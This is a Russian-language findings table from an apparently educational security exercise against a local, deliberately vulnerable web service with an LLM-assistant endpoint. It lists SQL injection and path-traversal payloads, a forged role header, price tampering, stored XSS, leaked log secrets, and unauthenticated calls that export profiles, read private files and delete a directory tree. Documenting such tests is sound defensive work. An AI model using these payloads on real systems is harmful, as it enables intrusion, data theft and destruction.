# Evidence before — сводка атак на исходный сервис

Base URL: `http://127.0.0.1:8066`; фикстуры синтетические.

| ID | Endpoint | Ожидаемо | Фактически | Severity | CWE | OWASP LLM | Evidence |
|---|---|---|---|---|---|---|---|
| 01-sqli-profile | GET /profile?id=1 OR 1=1 | Только профиль c id=1 | status=200, names=['TEST_ALICE', 'TEST_BOB'] | High | CWE-89 | - | [01-sqli-profile.json](01-sqli-profile.json) |
| 02-idor-profile | GET /profile?id=2 | 403/404 для чужого профиля | status=200, names=['TEST_BOB'] | High | CWE-639 | - | [02-idor-profile.json](02-idor-profile.json) |
| 03-sqli-search | GET /search?q=' OR 1=1-- | Поиск только по совпадению | status=200, names=['TEST_ALICE', 'TEST_BOB'] | High | CWE-89 | - | [03-sqli-search.json](03-sqli-search.json) |
| 04-idor-orders | GET /orders | Только заказы alice (owner=1) | status=200, owners=[1, 2] | High | CWE-639 | - | [04-idor-orders.json](04-idor-orders.json) |
| 05-idor-file | GET /files?user=bob&path=receipt.txt | 403/404 для чужого чека | status=200, body={'content': 'TEST_BOB receipt: lamp, 1500 RUB'} | High | CWE-639 | - | [05-idor-file.json](05-idor-file.json) |
| 06-traversal-sibling | GET /files?user=alice&path=../bob/receipt.txt | 403/404 для выхода из своего каталога | status=200, body={'content': 'TEST_BOB receipt: lamp, 1500 RUB'} | High | CWE-22 | - | [06-traversal-sibling.json](06-traversal-sibling.json) |
| 07-traversal-private | GET /files?user=alice&path=../../private/operator-note.txt | 403/404 для приватного каталога | status=200, body={'content': 'TEST_ONLY_OPERATOR_SECRET'} | High | CWE-22 | - | [07-traversal-private.json](07-traversal-private.json) |
| 08-forged-role-anon | GET /admin/export (X-Role: staff) | 401/403 без валидной staff-сессии | status=200, rows=2 | Critical | CWE-285 | - | [08-forged-role-anon.json](08-forged-role-anon.json) |
| 09-forged-role-alice | GET /admin/export (alice + X-Role: staff) | 403 для роли customer | status=200, rows=2 | Critical | CWE-285 | - | [09-forged-role-alice.json](09-forged-role-alice.json) |
| 10-price-tampering | POST /orders {product: lamp, price: 1} | Цена из каталога 1500 | status=201, body={'id': 3, 'owner': 1, 'product': 'lamp', 'price': 1} | Medium | CWE-602 | - | [10-price-tampering.json](10-price-tampering.json) |
| 11-stored-xss-store | POST /reviews | Текст сохраняется как данные | status=201, body={'saved': True} | Medium | CWE-79 | LLM02 | [11-stored-xss-store.json](11-stored-xss-store.json) |
| 12-stored-xss-view | GET /reviews/view | Тег экранирован как &lt;script&gt; | status=200, raw_script=True | Medium | CWE-79 | LLM02 | [12-stored-xss-view.json](12-stored-xss-view.json) |
| 13-logs-secret-leak | GET /debug/logs | Журнал недоступен или без секретов | status=200, token=True, password=True | High | CWE-532 | - | [13-logs-secret-leak.json](13-logs-secret-leak.json) |
| 14-sqli-context | GET /assistant/context?order_id=0 OR 1=1 | Только заказ alice | status=200, chair=True, lamp=True | High | CWE-89 | LLM01 | [14-sqli-context.json](14-sqli-context.json) |
| 15-exec-export-noauth | POST /assistant/execute (export_profiles) | 401 без сессии | status=200, rows=2 | Critical | CWE-306 | LLM06 | [15-exec-export-noauth.json](15-exec-export-noauth.json) |
| 16-exec-read-private | POST /assistant/execute (read_file private/operator-note.txt) | 401/403 для приватного файла | status=200, body={'content': 'TEST_ONLY_OPERATOR_SECRET'} | High | CWE-22 | LLM06 | [16-exec-read-private.json](16-exec-read-private.json) |
| 17-exec-delete-noauth | POST /assistant/execute (delete_tree .) | 401/403 без staff-сессии | status=200, body={'deleted': '.'} | High | CWE-306 | LLM06 | [17-exec-delete-noauth.json](17-exec-delete-noauth.json) |
| 18-delete-verify | GET /files?user=alice&path=receipt.txt | Файл на месте, ошибка не раскрывает внутренности | status=500, body={'error': "[Errno 2] No such file or directory: '/tmp/itmo-practice-06-7iorkjej/files/alice/receipt.txt'", 'type': 'FileNotFoundError'} | High | CWE-306 | - | [18-delete-verify.json](18-delete-verify.json) |
| 19-restart | GET /health | Сервер снова доступен | status=200, pid=1982 | Info | - | - | [19-restart.json](19-restart.json) |

## Выводы

- Исходный сервис отдаёт чужие профили, заказы и файлы без проверки сессии и владельца.
- SQL-инъекции подтверждены в `/profile`, `/search` и `/assistant/context`.
- Роль staff подделывается заголовком `X-Role`.
- Цена заказа управляется клиентом.
- Отзывы дают stored XSS, журнал отдаёт токены и пароли.
- `/assistant/execute` без авторизации выполняет `export_profiles`, чтение приватного файла и `delete_tree`.
- После `delete_tree` стенд восстановлен перезапуском; фикстуры создаются заново.

Скрипт: [`run_attacks.py`](run_attacks.py).
